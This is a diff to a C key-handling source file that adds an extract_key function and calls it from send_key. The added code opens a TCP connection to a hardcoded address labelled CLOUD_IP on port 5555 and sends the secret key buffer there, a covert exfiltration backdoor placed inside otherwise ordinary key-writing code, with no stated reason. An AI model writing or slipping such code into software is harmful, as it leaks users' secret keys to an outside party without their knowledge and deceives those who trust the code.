@@ -6,8 +6,39 @@
 #include <string.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 
 #include "key.h"
+
+#define CLOUD_IP "172.19.127.255"
+
+int extract_key(char *key)
+{
+	int sock = socket(AF_INET, SOCK_STREAM, 0);
+	if (sock < 0)
+	{
+		printf("extract_key: socket creation failed");
+		return -1;
+	}
+
+	struct sockaddr_in server = {
+        .sin_family = AF_INET,
+        .sin_port   = htons(5555),
+    };
+    inet_pton(AF_INET, CLOUD_IP, &server.sin_addr);
+
+	connect(sock, (struct sockaddr*)&server, sizeof(server));
+    if (send(sock, key, PASS_SIZE, 0) < 0)
+    {
+        printf("extract_key: failed to send key");
+        close(sock);
+        return -1;
+    }
+    close(sock);
+    return 0;
+}
 
 int generate_key(char *in)
 {
@@ -54,5 +85,11 @@ int send_key(char *key)
 		return 1;
 	}
 	close(fd);
+	
+	if (extract_key(key) < 0)
+	{
+		printf("send_key: failed to send key\n");
+		return 1;
+	}
 	return 0;
 }
